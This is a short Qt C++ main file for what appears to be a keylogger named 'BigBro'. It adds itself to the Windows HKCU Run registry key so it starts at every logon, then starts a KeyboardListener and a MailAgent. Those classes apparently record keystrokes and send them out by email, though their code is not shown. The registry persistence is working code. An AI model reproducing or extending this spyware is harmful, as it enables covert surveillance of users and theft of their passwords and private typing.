#include <QCoreApplication>
#include <QDir>
#include <QSettings>
#include <QDebug>
#include <QThread>

#include "keyboardlistener.h"
#include "mailagent.h"



void makeAutorun()
{
#ifdef Q_OS_WIN
    {
        QSettings settings("HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run", QSettings::NativeFormat);

        settings.setValue("BigBro", QDir::toNativeSeparators(QCoreApplication::applicationFilePath()));
    }
#endif

    qDebug() << "Application in autorun now";
}


int main(int argc, char *argv[])
{
    QCoreApplication a(argc, argv);
    qDebug() << "Application started";

    makeAutorun();



    KeyboardListener *listener  = new KeyboardListener();
    MailAgent        *mailAgent = new MailAgent();

    int res = a.exec();

    delete listener;
    delete mailAgent;

    return res;
}
